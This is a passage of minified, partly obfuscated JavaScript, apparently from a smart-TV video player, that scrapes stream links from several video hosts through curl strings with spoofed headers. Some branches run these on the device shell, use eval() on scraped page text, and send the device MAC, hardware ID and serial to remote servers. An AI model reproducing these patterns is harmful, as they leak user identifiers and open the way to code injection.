event.data!="undefined"){if(typeof event.data.duration!="undefined")Player.total_time=Math.ceil(event.data.duration);if(typeof event.data.played!="undefined")Player.cur_time=Math.ceil(event.data.played);if(Player.cur_time>3)$_("jw").style.zIndex="0";else $_("jw").style.zIndex="2";getVideoPlayInfo(Player.cur_time,Player.total_time)}},seek:function(n){console.log("seek to "+n);$_("playerjs").contentWindow.postMessage({"api":"seek","set":n},"*")}}
if(platform=="android-device"){$_("player").style.backgroundColor="transparent"}
pq.curCh.url=url;ll0lIOsIoIIlOlYpr(pq.curCh);return"assync"}else if(url.indexOf("youtube.com/watch?v=")>0||url.indexOf("youtube.com/embed")>0||url.indexOf("youtube.com/video")>0||url.indexOf("youtu.be/")>0){var video_id="";ypost=gV(pq,"ypost");console.log("ypost="+ypost);statusbar(url,"link");if(url.indexOf("v=")>0)video_id=url.substr(url.indexOf('=')+1);else if(url.indexOf("embed")>0)video_id=url.substr(url.indexOf('embed/')+6);else if(url.indexOf("video")>0)video_id=url.substr(url.indexOf('video/')+6);else if(url.indexOf("youtu.be/")>0)video_id=url.substr(url.indexOf('youtu.be/')+9);if(video_id==""){kjtYpr.inf("_FPNevernayaSsilka_ youtube!",1500);l1llOQI10lW1l_II101Ypr();return}
if(video_id.indexOf("?")>0)video_id=video_id.substr(0,video_id.indexOf("?"));var u="https://www.youtube.com/watch?v="+video_id+"&gl=US&hl=en&has_verified=1&bpctr=9999999999";if(timestamp>=3)var ser="";else if(Math.random()>0.5)ser=4;else ser=3;u2="http://exec"+ser+".remotecurl.ru/curl/yt-dlp.php?do=youtube&v="+video_id;var uh=uHelper.create("directnoheader|rf");var uh2=uHelper.create("directnoheader");uh2.local=1;uh2.atime=45000;var P1="",P2="";uh.parse=function(s){if(s.indexOf("Our systems have detected unusual traffic from your computer network")>0){kjtYpr.inf("YouTube says: Our systems have detected unusual traffic from your computer network",1300);uh2.get(u2);return}
uh2.postdata="html="+encodeURIComponent(s)+"";uh2.get(u2)}
uh2.parse=function(s){var m=l0QO11lOz0bfh10l0Ypr(s);if(m!=null){pq.curCh.json_url=m;lO1ll1n1_olOlOYpr(pq.curCh)}else{kjtYpr.inf("YouTube err "+s,1300);is_loadpage(-1)}}
if(0&&(app_cors||(kjtYpr.GL.remote>0&&kjtYpr.GL.remoteactive))){uh.remote=1;uh.get(u)}else uh2.getI(u2);return"assync"}else if(url.indexOf("delivembed.cc/embed/")>0||pq.curCh.menu_url=="delivembed"){var orig_url=url;var gurl=url;if(gurl.indexOf("?")>0)gurl=gurl.substr(0,gurl.indexOf("?"));var season=null;var episode=null;var mtc=url.match(/season=(.*?)(&|$|#)/);if(mtc!=null){season=mtc[1]}
var mtc=url.match(/episode=(.*)$/);if(mtc!=null){episode=mtc[1]}
var pref=url.match(/^(https?):\/\/(.*?)\//);function delive_res(data){console.log(data);var k=0,url="";for(var i in data){console.log("i="+i);var u1=data[i];var uB=pUrl(u1,pref[1]);if(platform=="android-device"){var u1=uB+"#OPT:Referer|"+gurl+"|User-Agent|"+ua_chrome+"|Origin|"+pref[1]+"://"+pref[2]}else{u1='curl "'+uB+'" -H "Referer: '+gurl+'" -H "Origin: '+pref[1]+'://'+pref[2]+'" -H "User-Agent: '+ua_chrome+'" -H "DNT: 1"'}
data[i]={"url":u1,"audio":1};console.log(sQual[kjtYpr.GL.quality]+80);if(url==""||(parseInt(i)>k&&i<(sQual[kjtYpr.GL.quality]+80))){console.log("set"+i);url=u1}}
console.log(data);console.log("url "+k+"="+url);if(url==""){l1llOQI10lW1l_II101Ypr();kjtYpr.inf("_FPOshibka_ _FPparsingaVideossilki_!",2000);return}
if(platform=="android-device"){if(mini)play_mini(url);else{pq.curCh.url=url;ll0lIOsIoIIlOlYpr(pq.curCh)}}else{var xhrt3=null;xhrt3=new XMLHttpRequest();xhrt3.onreadystatechange=function(){if(xhrt3.readyState==4){var u=xhrt3.responseText.match(/^.*\.m3u8$/m)[0];console.log(u);uB=uB.replace(/(^.*\/)(.*)/,"$1");if(u.indexOf("http")!=0)u=uB+u;console.log(u);u='curl "'+u+'" -H "Referer: '+gurl+'" -H "Origin: '+pref[1]+'://'+pref[2]+'" -H "User-Agent: '+ua_chrome+'""';var xhrt4=null;xhrt4=new XMLHttpRequest();xhrt4.onreadystatechange=function(){if(xhrt3.readyState==4){s=xhrt4.responseText;s=s.replace(/^(^[^#].*)/gm,"http://"+kjtYpr.GL.remoteip+"/proxym3u8"+uB+"$1OPT:Referer--"+gurl+"--Origin--"+pref[1]+"://"+pref[2]+"OPEND:/");console.log(s);lIl0l1OX1vbll1I1IQYprPost("http://195.88.208.101/obovse.ru/smarttv/hdrezka.php?id=post&n="+encodeURIComponent(u),"s="+encodeURIComponent(s),"sethls",request_id)}};console.log("delivembed "+url);xhrt4.open('GET',"http://"+kjtYpr.GL.remoteip+"/parserlink?"+encodeURIComponent(u),!0);xhrt4.send()}};console.log("delivembed "+url);xhrt3.open('GET',"http://"+kjtYpr.GL.remoteip+"/parserlink?"+encodeURIComponent(url),!0);xhrt3.send()}}
if(season!=null){var xhr2=new XMLHttpRequest();xhr2.onreadystatechange=function(){if(xhr2.readyState==4){clearTimeout(lOIlIQIgtxfl0lOlOYpr);var f=l0QO11lOz0bfh10l0Ypr(xhr2.responseText);console.log(f);var ch=[];for(var i in f){link=llIl1I1HlMgNII1IO0Ypr(f[i].urlQuality);if(!f[i].blocked)ch.push({"logo_30x30":f[i].poster.small,"title":f[i].name,"stream_url":gurl+"?episode="+link})}
if(ch.length){data={"channels":ch};curPage.lIQ0Il1IlIb1Il1OYpr=orig_url+"#stream_url";kjtYpr.ll00Il1IVOCk1IQO0OYpr(data,null,request_id)}}};xhr2.open('GET',"https://api1569851172.delivembed.cc/contents/video/by-season/?id="+season+"&host=zombie-film.com-embed",!0);xhr2.send();var atime=15000;lOIlIQIgtxfl0lOlOYpr=setTimeout(function(){xhr2.abort();is_loadpage(0);kjtYpr.inf('_FPPrevLimOzh_',1500,'yellow')},atime)}else if(episode!=null){delive_res(l0QO11lOz0bfh10l0Ypr(episode))}else if(app_cors||(kjtYpr.GL.remote>0&&kjtYpr.GL.remoteactive)){statusbar(url,"link");if(kjtYpr.GL.remote>0&&kjtYpr.GL.remoteactive)url="http://"+kjtYpr.GL.remoteip+"/parserlink?"+encodeURIComponent(url);console.log(url);var xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){try{var s=xhr.responseText;if(s.match(/oneSeason/)){if(season==null){var m=s.replace(/\n/g,"").replace(/\r/g,"").match(/var app = .*?\((\{.*?)\);/);console.log(m);eval("try{v1="+m[1].replace("playerBase","\"\"").replace("adsConfig","\"\"")+"}catch(e){console.log(e);}");console.log(v1);var xhr2=new XMLHttpRequest();xhr2.onreadystatechange=function(){if(xhr2.readyState==4){clearTimeout(lOIlIQIgtxfl0lOlOYpr);var f=l0QO11lOz0bfh10l0Ypr(xhr2.responseText);console.log(f);var ch=[];for(var i in f){if(!f[i].blocked)ch.push({"title":"Season "+f[i].season+" "+f[i].name,"stream_url":gurl+"?season="+f[i].id})}
if(ch.length){data={"channels":ch};curPage.lIQ0Il1IlIb1Il1OYpr=orig_url+"#stream_url";kjtYpr.ll00Il1IVOCk1IQO0OYpr(data,null,request_id)}}};xhr2.open('GET',"https://api1569851172.delivembed.cc/contents/season/by-franchise/?id="+v1.franchise+"&host=zombie-film.com-embed",!0);xhr2.send();var atime=15000;lOIlIQIgtxfl0lOlOYpr=setTimeout(function(){xhr2.abort();is_loadpage(0);kjtYpr.inf('_FPPrevLimOzh_',1500,'yellow')},atime)}
return}
var data=s.match(/hlsList: (\{.*?\})/);if(data!=null){data=l0QO11lOz0bfh10l0Ypr(data[1])}else{l1llOQI10lW1l_II101Ypr();kjtYpr.inf("_FPOshibka_ _FPparsingaVideossilki_!",2000);return}
delive_res(data);return}catch(e){l1llOQI10lW1l_II101Ypr();kjtYpr.inf("_FPOshibka_ _FPparsingaVideossilki_! "+e.message,2000);return}}};xhr.open('GET',url,!0);xhr.send()}else kjtYpr.inf("delivembed.cc - _FPNeobhodimRemoteFork_",2000);return"assync"}else if(url.indexOf("cdnvideo.co/embed")>0||url.match(/https?:\/\/[^\/]+\/embed\/\d+(\/|$)/)){if(app_cors||(kjtYpr.GL.remote>0&&kjtYpr.GL.remoteactive)){statusbar(url,"link");if(kjtYpr.GL.remote>0&&kjtYpr.GL.remoteactive)url="http://"+kjtYpr.GL.remoteip+"/parserlink?"+encodeURIComponent(url);console.log(url);xhr=null;xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){try{var s=xhr.responseText;var data=s.match(/file:"(.*?)"/);if(data!=null){console.log(data[1]);kjtYpr.YoutubeURL={};var regexp=new RegExp("(^|)(.*?)(http.*?)(,|$)","ig");var n=0;while((ch=regexp.exec(data[1]))!=null){console.log(ch);var r=ch[2].match(/\d+/)[0];if(isNaN(r))r=1;kjtYpr.YoutubeURL[r]={"title":r,"type":"","url":ch[3],"audio":1}}
console.log(kjtYpr.YoutubeURL);lO1ll1n1_olOlOYpr(mini);data=data[1].split(",")}else{l1llOQI10lW1l_II101Ypr();kjtYpr.inf("_FPOshibka_ _FPparsingaVideossilki_!",2000);return}}catch(e){l1llOQI10lW1l_II101Ypr();kjtYpr.inf("_FPOshibka_ _FPparsingaVideossilki_! "+e.message,2000);return}}};xhr.open('GET',url,!0);xhr.send()}else kjtYpr.inf("cdnvideo.co - _FPNeobhodimRemoteFork_",2000);return"assync"}else if(url.indexOf("ok.ru/video")>0){var video_id="";statusbar(url,"link");video_id=url.substr(url.indexOf('video/')+6);if(video_id.indexOf("?")>0)video_id=video_id.substr(0,video_id.indexOf("?"));if(video_id==""){kjtYpr.inf("_FPNevernayaSsilka_ ok!",1500);l1llOQI10lW1l_II101Ypr();return}
url="http://51.15.17.204/obovse.ru/smarttv/api.php?do=ok&box_client=lg&box_mac="+kjtYpr.mac+"&v="+video_id+"&box_hardware="+kjtYpr.hardware+"&initial="+box_client+"|"+kjtYpr.mac+"|"+kjtYpr.hardware+"|"+kjtYpr.serial+"|"+gnxu+"&box_server="+nServer+"&"+Math.random();console.log(url);xhr=null;xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){var data=l0QO11lOz0bfh10l0Ypr(xhr.responseText);if(typeof data!="object"||data==null){l1llOQI10lW1l_II101Ypr();kjtYpr.inf("_FPOshibka_ _FPparsingaVideossilki_!",2000);return}
url=xhr.responseText;console.log(url);if(mini){}else{pq.curCh.url=url;ll0lIOsIoIIlOlYpr(pq.curCh)}}};xhr.open('GET',url,!0);xhr.send();return"assync"}else if(url.indexOf("rutube.ru/play/embed/")>0||url.indexOf("rutube.ru/video/")>0){var video_id="";statusbar(url,"link");if(url.indexOf("embed")>0)video_id=url.substr(url.indexOf('embed/')+6);else video_id=url.substr(url.indexOf('video/')+6);if(video_id.indexOf("?")>0)video_id=video_id.substr(0,video_id.indexOf("?"));if(video_id==""){kjtYpr.inf("_FPNevernayaSsilka_ rutube!",1500);l1llOQI10lW1l_II101Ypr();return}
url="http://185.158.114.122/obovse.ru/smarttv/api.php?do=rutube&box_client=lg&box_mac="+kjtYpr.mac+"&v="+video_id;console.log("rutube "+video_id);console.log(url);xhr=null;xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.responseText.indexOf("[")==-1){console.log(xhr.responseText);l1llOQI10lW1l_II101Ypr();kjtYpr.inf(xhr.responseText,2000);return}
var data=l0QO11lOz0bfh10l0Ypr(xhr.responseText);if(typeof data!="object"||data==null){l1llOQI10lW1l_II101Ypr();kjtYpr.inf("_FPOshibka_ _FPparsingaVideossilki_!",2000);return}
kjtYpr.l0O1011I0MAZWd0100lIYpr=data;console.log(kjtYpr.l0O1011I0MAZWd0100lIYpr);var n=0;if(kjtYpr.GL.quality>1){for(var i=kjtYpr.l0O1011I0MAZWd0100lIYpr.length-1;i>=0;i--){if(kjtYpr.GL.quality<=kjtYpr.l0O1011I0MAZWd0100lIYpr[i][2]-1){n=i;break}}}
console.log("qual="+n);url=kjtYpr.l0O1011I0MAZWd0100lIYpr[n][1];console.log("qu="+url);if(mini)play_mini(url);else{pq.curCh.url=url;ll0lIOsIoIIlOlYpr(pq.curCh)}}};xhr.open('GET',url,!0);xhr.send();return"assync"}else if(gV(pq.curCh,"menu_url")=="videocdn"||gV(pq.curCh,"menu_url")=="hdvb"){console.log("parse videocdn");var uh=uHelper.create();uh.parse=function(s){console.log("res ");var m=s.match(/data-config='(.*?)'/);if(m!=null){console.log(m[1]);var f=l0QO11lOz0bfh10l0Ypr(m[1]);if(f.hls.indexOf("//")==0)f.hls="http:"+f.hls;console.log(f.hls);if(lIO1OIOlAQzl1Ol1lYpr=="jw"&&!mini&&app_cors){pq.curCh.url=f.hls;ll0lIOsIoIIlOlYpr(pq.curCh)}else{kjtYpr.YoutubeURL={};for(var i in["360","480","720"])kjtYpr.YoutubeURL[i]={"title":i,"type":"","url":f.hls.replace("index.m3u8",i+"/index.m3u8"),"audio":1};console.log(kjtYpr.YoutubeURL);lO1ll1n1_olOlOYpr(mini)}}else{kjtYpr.inf("_FPOshibka_ _FPparsingaVideossilki_ 2!",2000);l1llOQI10lW1l_II101Ypr();return}}
uh.get(url);return"assync"}else if(url.match(/\/serial\/[0-9]+/i)&&gV(pq.curCh,"menu_url")!="directlink"){console.log("parse tortuga serial");var uh=uHelper.create();uh.parse=function(s){console.log("res "+s);var m=s.match(/file:'(.*?)'/);if(m!=null){var f=l0QO11lOz0bfh10l0Ypr(m[1]);if(f!=null){console.log(f);uh.recurFolder(f,"",pq.curCh.title);data={"channels":uh.list};curPage.lIQ0Il1IlIb1Il1OYpr=url+"#stream_url";kjtYpr.ll00Il1IVOCk1IQO0OYpr(data,null,request_id)}else{kjtYpr.inf("_FPOshibka_ _FPparsingaVideossilki_ 012!",2000);l1llOQI10lW1l_II101Ypr();return}}else{kjtYpr.inf("_FPOshibka_ _FPparsingaVideossilki_ 011!",2000);l1llOQI10lW1l_II101Ypr();return}}
uh.get(url);return"assync"}else if(url.match(/\/vod\/[0-9]+/i)&&gV(pq.curCh,"menu_url")!="directlink"){console.log("parse tortuga");var uh=uHelper.create();uh.parse=function(s){console.log("res "+s);var m=s.match(/file:"(.*?)"/);if(m!=null){if(mini)play_mini(m[1]);else{pq.curCh.url=m[1];ll0lIOsIoIIlOlYpr(pq.curCh)}}else{kjtYpr.inf("_FPOshibka_ _FPparsingaVideossilki_ 1!",2000);l1llOQI10lW1l_II101Ypr();return}}
uh.get(url);return"assync"}else if(url.match(/https?:\/\/yadi\.sk\/(i|d)\/.+/i)&&gV(pq.curCh,"menu_url")!="directlink"){console.log("parse yadisk");var uh=uHelper.create();uh.parse=function(s){var m=s.match(/"store-prefetch">.*?(\{.*?)<\/script/);kjtYpr.YoutubeURL={};if(m!=null){var k=l0QO11lOz0bfh10l0Ypr(m[1]);if(k!=null){console.log(k);for(var z in k.resources){if(k.resources[z].videoStreams){var t=k.resources[z].videoStreams.videos;for(var i in t){console.log(t[i].dimension);if(is_m3u8(url))pstream=!0;else pstream=!1;if(!mini&&handmode==null&&kjtYpr.GL.streamplayer=="jw"&&t[i].dimension=="adaptive"){kjtYpr.YoutubeURL={};pq.curCh.url=t[i].url;ll0lIOsIoIIlOlYpr(pq.curCh);return}else{if(gV(t[i].size,"height")>0)
kjtYpr.YoutubeURL[t[i].size.height]={"title":t[i].dimension,"type":"","url":t[i].url,"audio":1}}}}}
console.log(kjtYpr.YoutubeURL);lO1ll1n1_olOlOYpr(mini)}else{kjtYpr.inf("_FPOshibka_ webpage yadisk!",2000);l1llOQI10lW1l_II101Ypr();return}}else{kjtYpr.inf("_FPOshibka_ _FPparsingaVideossilki_ yadisk!",2000);l1llOQI10lW1l_II101Ypr();return}}
uh.remote=1;uh.get(url);return"assync"}else if(gV(pq.curCh,"menu_url")=="kodik"||url.match(/kodik.*\/video\/[0-9]+\/[0-9a-z]+\//i)){console.log("parse kodik");function kodik_start(u){statusbar(u,"link");var lc='curl -L "'+u+'" -H "Referer: https://we.kinokong.ws/" -H "Pragma: no-cache" -H "DNT: 1" -H "Accept-Encoding: deflate" -H "Accept-Language: ru,en;q=0.8,uk;q=0.6,bg;q=0.4" -H "User-Agent: '+ua_chrome+'" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Cache-Control: no-cache" -H "Connection: keep-alive"';if(platform=="android-device"){var s=andr.cmd(lc);kodik_parse(s);return"assync"}
xhr_abort=!1;var xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){clearTimeout(lOIlIQIgtxfl0lOlOYpr);kodik_parse(xhr.responseText)}};if(kjtYpr.GL.remote>0&&kjtYpr.GL.remoteactive){url="http://"+kjtYpr.GL.remoteip+"/parserlink?"+encodeURIComponent(lc)}else if(kjtYpr.series!="D"&&kjtYpr.series!="C"&&app_cors&&xhr_referer==3){xhr.setRequestHeader("User-Agent",ua_chrome);xhr.setRequestHeader("Accept","*/*");xhr.setRequestHeader("Accept-Encoding","deflate");xhr.setRequestHeader("Referer",url)}else{serv=["195.88.208.101","46.36.218.194","185.158.114.122"];url="http://"+serv[_.random(0,2)]+"/xhr.php?u="+encodeURIComponent(lc);if(cmdReload){cmdReload=!1;url+="&refresh=true"}}
xhr.open('GET',url,!0);xhr.send();var atime=15000;lOIlIQIgtxfl0lOlOYpr=setTimeout(function(){xhr_abort=!0;xhr.abort();kjtYpr.inf('_FPPrevLimOzh_',1500,'yellow');is_loadpage(0)},atime)}
function kodik_parse(s){console.log("res ");var m=s.match(/iframe.src = "(.*?)"/);if(m!=null){console.log(m[1]);var v1=m[1].match(/\/video\/(\d+)\/(.*?)\/.*?\?(.*)$/);if(v1!=null){var obj={};var pairs=v1[3].split('&');for(var i in pairs){var split=pairs[i].split('=');obj[decodeURIComponent(split[0])]=decodeURIComponent(split[1])}
console.log(obj);lc='curl "https://kodik.info/video-links" -H "Origin: https://kodik.info" -H "User-Agent: '+ua_chrome+'" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "Accept: application/json, text/javascript, */*; q=0.01" -H "Referer: https:'+m[1]+'" -H "X-Requested-With: XMLHttpRequest" -H "DNT: 1" --data "d='+obj.d+'&d_sign='+obj.d_sign+'&pd='+obj.pd+'&pd_sign='+obj.pd_sign+'&ref='+encodeURIComponent(obj.ref)+'&ref_sign='+obj.ref_sign+'&bad_user=false&type=video&hash='+v1[2]+'&id='+v1[1]+'"';if(platform=="android-device"){var s=andr.cmd(lc);kodik_res(s);return"assync"}
xhr_abort=!1;var xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){clearTimeout(lOIlIQIgtxfl0lOlOYpr);kodik_res(xhr.responseText)}};if(kjtYpr.GL.remote>0&&kjtYpr.GL.remoteactive){url="http://"+kjtYpr.GL.remoteip+"/parserlink?"+encodeURIComponent(lc)}else if(0&&kjtYpr.series!="D"&&kjtYpr.series!="C"&&app_cors&&xhr_referer==3){xhr.setRequestHeader("User-Agent",ua_chrome);xhr.setRequestHeader("Accept","*/*");xhr.setRequestHeader("Accept-Encoding","deflate");xhr.setRequestHeader("Referer",url)}else{serv=["195.88.208.101","46.36.218.194","185.158.114.122"];url="http://"+serv[_.random(0,2)]+"/xhr.php?u="+encodeURIComponent(lc);if(cmdReload){cmdReload=!1;url+="&refresh=true"}}
xhr.open('GET',url,!0);xhr.send();var atime=15000;lOIlIQIgtxfl0lOlOYpr=setTimeout(function(){xhr_abort=!0;xhr.abort();kjtYpr.inf('_FPPrevLimOzh_',1500,'yellow');is_loadpage(0)},atime)}else{kjtYpr.inf("_FPOshibka_ _FPparsingaVideossilki_ 1!",2000);l1llOQI10lW1l_II101Ypr();return}}else{kjtYpr.inf("_FPOshibka_ _FPparsingaVideossilki_ 2!",2000);l1llOQI10lW1l_II101Ypr();return}}
function kodik_res(s){var f=l0QO11lOz0bfh10l0Ypr(s);console.log(f);kjtYpr.YoutubeURL={};if(f!=null){for(var i in f.links){var u1=f.links[i][0].src;if(u1.indexOf("//")==0)u1="http:"+u1;kjtYpr.YoutubeURL[i]={"title":i,"type":"","url":u1,"audio":1}}
console.log(kjtYpr.YoutubeURL);lO1ll1n1_olOlOYpr(mini)}else{kjtYpr.inf("_FPOshibka_ _FPparsingaVideossilki_ 3!",2000);l1llOQI10lW1l_II101Ypr();return}}
kodik_start(url);return"assync"}
return url}
var confirmed={create:function(text,title,but,style){var c=this;c.close();c.title=title;c.select=0;if(but==null)but="_FPProdolzhit_|_FPOtmena_";c.but=but.split("|");c.fun0=function(){};c.fun1=function(){};if(title==null)title="_FPConfirm action_";c.title=title;c.template="<div style='background-color:#556266;;margin:0px 0px 0px 0px;overflow:hidden;'>"+"<div id='confirmTitle' style='margin:5px;overflow:hidden;text-align:left;font-size: 122%;'>{title}</div>"+"<div id='confirmText' style='margin:4px;overflow:hidden;text-align:center;'>{text}</div>"+"<div id='confirmButtons' style='padding:"+css_w(3)+"px;text-align:right;height: "+css_wh(31)+"px;'>{buttons}</div>"+"</div>";c.render(text,style);return c},sel:function(n){var c=this;if(n=="++")c.select++;else if(n=="--")c.select--;else c.select=n;console.log(c.but);if(c.select<0)c.select=c.but.length-1;else if(c.select>=c.but.length)c.select=0;for(var i=0;i<c.but.length;i++){if(i==c.select)$_("dnsc"+i).style.backgroundColor='#307ebc';else $_("dnsc"+i).style.backgroundColor='transparent'}},click:function(n){var c=this;if(n!=null)c.select=n;handler="menu";if(c.select==0)c.fun0();else if(c.select==1)c.fun1();c.close()},render:function(text,style){var c=this;var div=document.createElement('div');div.id="l1IOI0lu11lO1IYpr";div.style.position="absolute";div.style.textAlign="center";div.style.border="";div.style.borderRadius="";div.style.fontSize=css_wh(22)+"px";div.style.zIndex="1";div.style.visibility="hidden";div.style.width=css_w(560)+"px";div.style.left=css_w(355)+"px";if(style=="fullscreen")style={"width":css_w(1250)+"px","height":css_wh(690)+"px","left":css_w(10)+"px","top":css_w(10)+"px","textAlign":"left","overflow":"hidden"};if(style!=null)for(var i in style)div.style[i]=style[i];if(text==null){text="_FPOshibka_ _FPopredDns_!<br>  Смените днс или установите RemoteFork на PC или Android<br>_FPVseRavnoProdolzhit_?";if(uaJ=="android"){text="Установить RemoteFork.apk на это Android устройство?<br>Если Remotefork уже установлен то нажмите _FPOtmena_ и запустите его<br>Подробнее http://forkplayer.tv/smart-tv/remotefork/";c.but="_FPDownload RemoteFork_|_FPOtmena_"}}
if(box_low||box_low2)var st="";else st="word-wrap: break-word;overflow-wrap: break-word;";var buttons="";for(var i=0;i<c.but.length;i++){buttons+="<span id='dnsc"+i+"' class='cbutton' onmouseover=\"confirmed.sel("+i+");\" onclick=\"confirmed.click("+i+");\" style='background-color:red;'>"+c.but[i]+"</span>"}
var inner=c.template.replace("{title}",c.title).replace("{text}",text).replace("{buttons}",buttons);console.log("inner "+div);$_("main").appendChild(div);lI1I1IxFCIh1l01llYpr("l1IOI0lu11lO1IYpr",inner);handler="confirm";setTimeout(function(){handler="confirm";var x=720-$_("l1IOI0lu11lO1IYpr").offsetHeight;if(x<10)x=10;if(x>205)x=205;$_("l1IOI0lu11lO1IYpr").style.top=x+"px";$_("l1IOI0lu11lO1IYpr").style.visibility="visible";$_("main").onclick=function(){confirmed.click(1)}},250);c.sel(1)},close:function(){if($_("l1IOI0lu11lO1IYpr")!=null)$("#l1IOI0lu11lO1IYpr").remove();$_("main").onclick="";console.trace()}};function l1IOI0lu11lO1IYpr(mode,text,but){if(mode==15){confirmed.create("Для торрент ссылок magnet: torrent://  необходим Ace Stream или Torrserve, для torrentb64:// Ace Stream! Проверьте запущен ли Ace Stream на "+getip("acestream")+" или Torrserve на "+getip("torrserve")+"<br>Или пропишите правильный IP в Настройках приложения","Необходим Ace Stream или Torrserve","_FPNastroiki_ IP|_FPOtmena_").fun0=function(){ol1IO0ORc1_tI0QlYpr({"playlist_url":"about:settings","defaultSelect":24})}}}
function sbrosok(noreload){try{pqrs();document.cookie=""}catch(e){}
try{for(var i in allfs){kjtYpr.lll0Il11OxICbl1ll0Ypr(allfs[i],"")}
kjtYpr.lll0Il11OxICbl1ll0Ypr("vk_audio_pl","");kjtYpr.lll0Il11OxICbl1ll0Ypr("vk_audio_sel","");for(var key in localStorage){localStorage.removeItem(key)}}catch(e){kjtYpr.popUp(e)}
kjtYpr.lll0Il11OxICbl1ll0YprC("ID",kjtYpr.mac);kjtYpr.lll0Il11OxICbl1ll0Ypr("ID",kjtYpr.mac);kjtYpr.lll0Il11OxICbl1ll0YprC("IDS",kjtYpr.serial);kjtYpr.lll0Il11OxICbl1ll0Ypr("IDS",kjtYpr.serial);kjtYpr.lll0Il11OxICbl1ll0YprC("oID",oID);kjtYpr.lll0Il11OxICbl1ll0Ypr("oID",oID);kjtYpr.setDefault();oInset[insetActive].history=[];insetActive=0;prev={};loadinfo("Сброс выполнен!");if(noreload==null){kjtYpr.popUp("_FPSbrosVipolnenPerezpusk_...");setTimeout('document.location.reload();	location.reload();',700)}}
function plxmini(x){plx(x,!0)}
function plx(x,mini){try{if(typeof x.response.url240=="string")kjtYpr.l0O1011I0MAZWd0100lIYpr.push(Array("240p",x.response.url240,4));if(typeof x.response.url360=="string")kjtYpr.l0O1011I0MAZWd0100lIYpr.push(Array("360p",x.response.url360,3));if(typeof x.response.url480=="string")kjtYpr.l0O1011I0MAZWd0100lIYpr.push(Array("480p",x.response.url480,2));if(typeof x.response.url720=="string")kjtYpr.l0O1011I0MAZWd0100lIYpr.push(Array("720p",x.response.url720,1));var n=0;for(var i=kjtYpr.l0O1011I0MAZWd0100lIYpr.length-1;i>=0;i--){if(kjtYpr.GL.quality<=kjtYpr.l0O1011I0MAZWd0100lIYpr[i][2]){n=i;break}}
kjtYpr.llII110Ic1wWOIIIlYprQualIndex=n;url=kjtYpr.l0O1011I0MAZWd0100lIYpr[n][1]}catch(e){url=""}
if(url==""){kjtYpr.inf("_FPPustayaIliUdalSsilkaVK_!",1200);lIlI0I111vaIOl00Ypr()}else{if(mini)play_mini(url);else{lIIl0Il0LaVOO0OIYpr();ll0lIOsIoIIlOlYpr(url)}}};playUrl="",playUrlAudio="",playIdent="";function play_mini(url){try{if(getSelect()<0)return;if(curCh("is_parent_lock")){if(kjtYpr.Password!=kjtYpr.GL.passwordkey){if(handler=="menu")l1llOQI10lW1l_II101Ypr();return}}
var ident=getIdent();if(playIdent==ident&&url==null){return}else playIdent=ident;if(url!=null)sturl=url;else sturl=curCh("stream_url");if(is_audio(sturl))return;if(sturl.indexOf("/hls/userencrypt/")>0){sturl=parse_urlm(sturl)}
var Ch=curCh();if(curCh("parser")!=""&&url==null){console.log("Parse MINI");return}
console.log("play mini lI0lllQIIIvMhJ1I11lYpr "+url);if(url==null){playUrl=lI0lllQIIIvMhJ1I11lYpr(sturl,!0);if(playUrl==null)return}else playUrl=sturl;if(playUrl.indexOf("audio")==0||playUrl.indexOf("/mtd")==0)return;if(handler!="menu"||minimize||playUrl.indexOf("/")==-1)return;if(playUrl.indexOf("LOCAL_IP")>0)playUrl=playUrl.replace(/LOCAL_IP/g,kjtYpr.GL.remoteip.split(":")[0]);l1llOQI10lW1l_II101Ypr();try{l0I1lljnfqdllllOIYpr()}catch(e){}
plmini_on=!0;plmini_canplay=!1;$_("main").style.background="";$_("rightHalf").style.maxHeight="50.6%";FXMLPage.lIlO1OI1Mlt001lIYpr({"mini":1});videoLoad("on");if(gP().is_iptv>2)pstream=!0;else pstream=!1;setTimeout(function(){if(platform=="sams"){if(is_m3u8(playUrl)==2&&-1===playUrl.indexOf("COMPONENT=HLS"))playUrl+="|COMPONENT=HLS";if(Player.Sef){Player.SefPlugin.Open('Player','1.000','Player');Player.SefPlugin.Execute('InitPlayer',playUrl);Player.SefPlugin.OnEvent='Player.SefOnEvent';Player.SefPlugin.Execute('StartPlayback',0);Player.SefPlugin.Execute('SetDisplayArea',643,340,317,200)}else{if(kjtYpr.series=="C"){console.log("c plugin player:"+playUrl);Player.plugin.Play(playUrl)}else{console.log("d plugin player:");Player.plugin.InitPlayer(playUrl);if(Player.get3DMode()!=0){Player.plugin.SetPlayerProperty('2','3',Player.get3DMode())}else{if(playUrl.indexOf('.mp3')>0){Player.plugin.SetPlayerProperty('2','0','0')}}
Player.plugin.StartPlayback()}
Player.plugin.SetDisplayArea(643,340,317,200)}}else{if(is_m3u8(playUrl))pstream=!0;else pstream=!1;lIO1OIOlAQzl1Ol1lYpr=(pstream)?kjtYpr.GL.streamplayer:kjtYpr.GL.player;if(lIO1OIOlAQzl1Ol1lYpr=="tizen"){$_("av-player").style.display="none";try{webapis.avplay.stop();webapis.avplay.open(playUrl)}catch(e){kjtYpr.popUp("Error 1<br>"+e.message,4000)}
webapis.avplay.setListener({onbufferingstart:function(){},onbufferingprogress:function(e){},onbufferingcomplete:function(){var trackInfo=webapis.avplay.getTotalTrackInfo();Player.tnum=0;Player.snum=0;Player.tnum_start=-1;Player.snum_start=-1;for(var i=0;i<trackInfo.length;i++){if(trackInfo[i].type=="AUDIO"){if(Player.tnum_start<0)Player.tnum_start=i;Player.tnum++}
